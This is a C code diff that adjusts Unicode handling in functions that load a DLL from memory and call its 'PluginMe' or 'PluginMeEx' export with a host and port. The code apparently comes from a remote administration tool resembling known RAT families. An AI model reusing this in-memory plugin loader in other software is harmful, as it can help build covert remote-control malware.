@@ -21,11 +21,17 @@ void LoadFromMemory(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
 		return;
 	}
 
+	PluginMe myPluginMe = (PluginMe)MemoryGetProcAddress(HDll, "PluginMe");
+
+#ifdef UNICODE
 	CHAR lpHost[1024];
 	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);
 
-	PluginMe myPluginMe = (PluginMe)MemoryGetProcAddress(HDll, "PluginMe");
 	myPluginMe(lpHost, nPort, lpBuffer);
+#else
+	myPluginMe(lpszHost, nPort, lpBuffer);
+#endif
+
 	MemoryFreeLibrary(HDll);
 
 	//if (data) HeapFree(GetProcessHeap(), 0,data);
@@ -39,11 +45,17 @@ void LoadFromMemoryEx(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer
 		return;
 	}
 
+	PluginMeEx myPluginMeEx = (PluginMeEx)MemoryGetProcAddress(module, "PluginMeEx");
+
+#ifdef UNICODE
 	CHAR lpHost[1024];
 	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);
 
-	PluginMeEx myPluginMeEx = (PluginMeEx)MemoryGetProcAddress(module, "PluginMeEx");
 	myPluginMeEx(lpHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
+#else
+	myPluginMeEx(lpszHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
+#endif
+
 	MemoryFreeLibrary(module);
 
 	//if (data) HeapFree(GetProcessHeap(), 0,data);
@@ -69,7 +81,16 @@ void LoadFromMemory(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
 	}
 
 	myPluginMe = (PluginMe)GetProcAddress(HDll, "PluginMe");
+
+#ifdef UNICODE
+	CHAR lpHost[1024];
+	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);
+
+	myPluginMe(lpHost, nPort, lpBuffer);
+#else
 	myPluginMe(lpszHost, nPort, lpBuffer);
+#endif
+
 	FreeLibrary(HDll);
 
 	//if (data) HeapFree(GetProcessHeap(), 0,data);
@@ -92,7 +113,16 @@ void LoadFromMemoryEx(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer
 	}
 
 	myPluginMeEx = (PluginMeEx)GetProcAddress(module, "PluginMeEx");
+
+#ifdef UNICODE
+	CHAR lpHost[1024];
+	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);
+
+	myPluginMeEx(lpHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
+#else
 	myPluginMeEx(lpszHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
+#endif
+
 	FreeLibrary(module);
 
 	//if (data) HeapFree(GetProcessHeap(), 0,data);
@@ -169,7 +199,7 @@ DWORD WINAPI Loop_ProxyManager(LPVOID lparam)
 	return 0;
 }
 
-extern TCHAR	svcname[MAX_PATH];
+extern TCHAR svcname[MAX_PATH];
 
 DWORD WINAPI Loop_MyTools(LPVOID lparam)
 {
